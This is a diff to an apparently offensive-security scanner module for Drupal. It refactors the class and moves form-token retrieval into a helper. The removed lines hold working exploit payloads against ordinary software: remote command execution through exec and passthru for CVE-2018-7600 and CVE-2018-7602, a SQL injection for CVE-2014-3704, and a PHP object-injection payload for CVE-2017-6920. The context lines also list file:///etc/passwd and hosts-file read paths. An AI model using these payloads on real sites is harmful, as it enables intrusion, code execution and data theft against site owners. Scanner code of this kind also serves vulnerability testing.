@@ -24,12 +24,9 @@ file:///etc/passwd
 file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
-from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5
-from lib.tool.logger import logger
+# from lib.initial.config import config
 from lib.tool.thread import thread
-from thirdparty import requests
-import re
+from payloads.Drupal.tool_get_token import get_form_token
 from payloads.Drupal.cve_2014_3704 import cve_2014_3704_scan
 from payloads.Drupal.cve_2017_6920 import cve_2017_6920_scan
 from payloads.Drupal.cve_2018_7600 import cve_2018_7600_scan
@@ -37,84 +34,20 @@ from payloads.Drupal.cve_2018_7602 import cve_2018_7602_scan
 
 class Drupal():
     def __init__(self):
-        self.timeout = config.get('timeout')
-        self.headers = config.get('headers')
-        self.proxies = config.get('proxies')
-
         self.app_name = 'Drupal'
-        self.md = md5(self.app_name)
-        self.cmd = 'echo ' + self.md
 
-        self.cve_2018_7600_payloads = [
-            {
-                'path': 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
-                'data': 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]={}'.format(self.cmd)
-            },
-        ]
-
-        self.cve_2014_3704_payloads = [
-            {
-                'path': '?q=node&destination=node',
-                'data': 'pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a'
-            }
-        ]
-        
-        self.cve_2017_6920_payloads = [
-            {
-                'path': 'admin/config/development/configuration/single/import',
-                'data': 'config_type=system.simple&config_name=mouse&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token={}&form_id=config_single_import_form&op=Import'
-            },
-            {
-                'path': 'config/development/configuration/single/import',
-                'data': 'config_type=system.simple&config_name=mouse&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token={}&form_id=config_single_import_form&op=Import'
-            }
-        ]
-
-        self.cve_2018_7602_payloads = [
-                {
-                    'path': '?q=%2Fuser%2F1%2Fcancel',
-                    'data': ''
-                },
-                {
-                    'path': '?q=%2Fuser%2F1%2Fcancel&destination=%2Fuser%2F1%2Fcancel%3Fq%5B%2523post_render%5D%5B%5D%3Dpassthru%26q%5B%2523type%5D%3Dmarkup%26q%5B%2523markup%5D%3D' + self.cmd,
-                    'data': 'form_id=user_cancel_confirm_form&form_token={}&_triggering_element_name=form_id&op=Cancel+account'
-                },
-                {
-                    'path': '?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F',
-                    'data': 'form_build_id='
-                },
-            ]
-
-    def get_form_token(self, target, vul_info):
-        ''' 获取drupal的form_token '''
-        res = requests.get(
-            target, 
-            timeout=self.timeout, 
-            headers=self.headers,
-            proxies=self.proxies, 
-            verify=False,
-            allow_redirects=False
-        )
-        logger.logging(vul_info, res.status_code, res)      # * LOG
-        
-        form_token = re.search(r'name="form_token" value=".{43}', res.text, re.I|re.M|re.U|re.S)
-        if (form_token):
-            self.form_token = form_token.group().replace('name="form_token" value="', '')
-            return self.form_token 
-        else:
-            return None
-    
-    def addscan(self, url, vuln=None):
+    def addscan(self, clients, vuln=None):
         if vuln:
-            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+            return eval('thread(target=self.{}_scan, clients=clients)'.format(vuln))
 
         return [
-            thread(target=self.cve_2014_3704_scan, url=url),
-            thread(target=self.cve_2017_6920_scan, url=url),
-            thread(target=self.cve_2018_7600_scan, url=url),
-            thread(target=self.cve_2018_7602_scan, url=url)
+            thread(target=self.cve_2014_3704_scan, clients=clients),
+            thread(target=self.cve_2017_6920_scan, clients=clients),
+            thread(target=self.cve_2018_7600_scan, clients=clients),
+            thread(target=self.cve_2018_7602_scan, clients=clients)
         ]
 
+Drupal.get_form_token = get_form_token
 Drupal.cve_2014_3704_scan = cve_2014_3704_scan
 Drupal.cve_2017_6920_scan = cve_2017_6920_scan
 Drupal.cve_2018_7600_scan = cve_2018_7600_scan
